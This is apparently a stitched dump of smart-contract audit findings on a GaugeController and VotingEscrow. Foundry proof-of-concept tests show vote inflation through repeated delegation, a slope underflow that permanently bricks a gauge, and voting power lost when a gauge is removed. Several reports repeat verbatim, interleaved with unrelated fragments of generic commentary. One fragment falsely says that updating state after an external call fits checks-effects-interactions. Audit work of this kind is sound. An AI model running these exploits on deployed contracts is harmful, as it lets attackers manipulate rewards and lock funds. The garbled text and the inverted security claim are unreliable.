            "detail": "\n# Vulnerability details\n\n## Impact\nDelegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

            "detail": "\n# Vulnerability details\n\n`_get_weight` function is used in order to return the total gauge's weight and it also updates past values of the `points_weight` mapping, if `time_weight[_gauge_addr]` is less or equal to the `block.timestamp`. It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow"

            "detail": "\n# Vulnerability details\n\n`_get_weight` function is used in order to return the total gauge's weight and it also updates past values of the `points_weight` mapping, if `time_weight[_gauge_addr]` is less or equal to the `block.timestamp`. It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow"

            "detail": "\n# Vulnerability details\n\n## Impact\nDelegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

Ordinarily, in smart contract development, it is advised to use the 'checks-effects-interactions' pattern to mitigate reentrancy attacks. An external call prior to updating contract states may give an opportunity for an attacker to call back into the contract, potentially leading to unexpected behaviors or vulnerabilities such as reentrancy. The description provided suggests that while there is a 'nonReentrant' modifier in place, without knowing its implementation and the behavior of the '_delegate' function, it is impossible to determine if the protection is sufficient. Therefore, the reported sequence of actions could lead to issues if the state updates are expected to occur before the external interactions. Further assessment would be needed for a more precise evaluation, but as reported, the code contradicts best contract practices and could be vulnerable to reentrancy or other attack vectors.",

The impact of this vulnerability is significant as delegating to address 0 can corrupt the state of the `_delegates` mapping and lead to logical issues in vote tracking and delegate state. The `_moveDelegates` function may attempt to subtract an amount from a delegate's vote count that is not set or has an unrealistic value (0 in the case of an uninitialized checkpoint), which could underflow. This logical inconsistency can further cause failures in typical contract functions like `burn`, which relies on correctly moving delegate votes.

            "detail": "\n# Vulnerability details\n\n## Impact\nDelegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

            "detail": "\n# Vulnerability details\n\n## Summary\n\nIf governance removes a gauge for any (non-malicious) reason, a user's voting power for that gauge will be completely lost.\n\n## Vulnerability details\n\nThe `GaugeController` is a solidity port of Curve DAO's Vyper implementation. Users are to vote for channeling incentives by using the `vote_for_gauge_weights()` function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).\n\nOne modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user's voting power before removal is not reset. Since `vote_for_gauge_weights()` does not allow voting for removed gauges, the voting power is then forever lost.\n\nConsider the following scenario:\n- Alice has some veRWA, and is now able to vote. \n- She votes on some pool, say, G1, using 100% of her voting power.\n- Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired.\n- Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.\n\nIt is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.\n\n## Impact\n\nUsers can lose their voting power.\n\n## Proof of concept\n\nWe provide the following POC to use on `GaugeController` tests.\n\n```solidity\nfunction testPOC() public {\n    // prepare\n    uint256 v = 10 ether;\n    vm.deal(gov, v);\n    vm.startPrank(gov);\n    ve.createLock{value: v}(v);\n\n    // add gauges\n    gc.add_gauge(gauge1);\n    gc.change_gauge_weight(gauge1, 100);\n    gc.add_gauge(gauge2);\n    gc.change_gauge_weight(gauge2, 100);\n\n    // all-in on gauge1\n    gc.vote_for_gauge_weights(gauge1, 10000);\n\n    // governance removes gauge1\n    gc.remove_gauge(gauge1);\n\n    // cannot vote for gauge2\n    vm.expectRevert(\"Used too much power\");\n    gc.vote_for_gauge_weights(gauge2, 10000);\n\n    // cannot remove vote for gauge1\n    vm.expectRevert(\"Invalid gauge address\"); // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge1, 0);\n\n    // cannot vote for gauge2 (to demonstrate again that voting power is not removed)\n    vm.expectRevert(\"Used too much power\");  // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge2, 10000);\n}\n```\n\n## Tools used\n\nForge, manual review\n\n## Recommended mitigation steps\n\nThe simplest way to mitigate this is to **allow zero-weight votings on expired pools** simply to remove the vote. Modify line 213 as follow:\n\n```solidity\nrequire(_user_weight == 0 || isValidGauge[_gauge_addr], \"Can only vote 0 on non-gauges\");\n```\n\nhttps://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213\n\nThe given POC can then be the test case to verify successful mitigation.\n\nAs a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.\n\n\n## Assessed type\n\nInvalid Validation"

If this modifier is not implemented correctly or if the governance mechanism is flawed, it could possibly allow unauthorized access, making the contract vulnerable to unauthorized actions.\n- **Reentrancy**: The `_change_gauge_weight` function may call external contracts or interact with untrusted code. If it's not designed with reentrancy attacks in mind, it might lead to vulnerabilities where an attacker could potentially disrupt the state changes or drain funds.\n- **State Changes After External Calls**: If `_change_gauge_weight` interacts with external contracts, modifying the state (`isValidGauge[_gauge] = false;`) after this call, as in the given code, is usually safer and in line with the Checks-Effects-Interactions pattern.

A gauge could be re-added with a non-zero weight, which gets added to the `totalWeight`. If this occurs before the rewards are queued (`queueRewardsForCycle()`), the system may function with a `totalWeight` that does not accurately reflect the added gauge's weight due to the fact that rewards are calculated based on the `storedWeight` from the previous cycle (`totalWeight.storedWeight`), as the `currentCycle` would not be less than the `currentCycle` being checked against. The issue lies with the re-addition process described in `_addGauge()` and the subsequent reward calculation logic, leading to an erroneous `totalWeight` during reward distribution. The vulnerability becomes apparent when a gauge is re-added before the reward calculations for a new cycle, which should be adjusted to ensure accurate `totalWeight` reflects the actual weights at the time of reward distribution.",
